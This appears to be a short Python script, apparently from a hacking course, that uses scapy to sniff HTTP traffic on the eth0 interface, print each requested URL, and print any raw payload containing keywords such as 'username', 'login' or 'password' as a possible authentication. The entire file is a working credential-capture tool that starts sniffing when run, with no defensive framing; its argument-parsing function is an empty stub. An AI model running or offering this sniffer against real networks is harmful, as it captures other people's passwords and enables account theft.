import optparse
import scapy.all as scapy
from scapy.layers import http


def get_arguments():
    pass

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("HTTP Request >>" + str(url))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in str(load):
                    print("[+] Possible Authentication > " + str(load) + "\n\n")
                    break

sniff("eth0")